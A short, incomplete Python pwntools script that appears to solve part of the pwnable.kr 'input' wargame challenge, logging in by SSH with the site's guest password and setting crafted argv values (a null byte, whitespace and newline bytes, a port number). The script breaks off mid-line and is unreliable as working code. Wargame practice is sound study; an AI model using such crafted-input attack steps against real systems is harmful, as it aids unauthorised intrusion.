from pwn import *

shell = ssh('input2', 'pwnable.kr', password='guest', port=2222)

argv = ["" for i in range (100)]
argv[65] = "\x00"
argv[66] = "\x20\x0a\x0d"
argv[67] = "8888"

process = shell.process(execu)